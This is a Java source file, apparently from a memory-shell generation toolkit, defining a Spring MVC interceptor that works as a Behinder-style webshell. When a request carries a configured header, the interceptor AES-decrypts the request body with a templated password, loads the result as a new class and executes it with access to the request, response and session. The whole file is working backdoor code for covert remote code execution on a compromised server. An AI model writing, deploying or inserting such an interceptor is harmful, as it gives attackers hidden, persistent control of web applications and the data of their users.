package com.reajason.javaweb.memshell.springmvc.behinder;

import org.springframework.web.servlet.AsyncHandlerInterceptor;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/22
 */
public class BehinderInterceptor extends ClassLoader implements AsyncHandlerInterceptor {
    public String pass = "{{pass}}";
    public String headerName = "{{headerName}}";
    public String headerValue = "{{headerValue}}";

    @SuppressWarnings("all")
    public Class<?> g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public BehinderInterceptor(ClassLoader c) {
        super(c);
    }


    public BehinderInterceptor() {
    }

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
            try {
                HttpSession session = request.getSession();
                Map<String, Object> obj = new HashMap<String, Object>(3);
                obj.put("request", request);
                obj.put("response", response);
                obj.put("session", session);
                session.setAttribute("u", this.pass);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
                byte[] bytes = c.doFinal(base64Decode(request.getReader().readLine()));
                Object instance = (new BehinderInterceptor(this.getClass().getClassLoader())).g(bytes).newInstance();
                instance.equals(obj);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return false;
        } else {
            return true;
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }
}
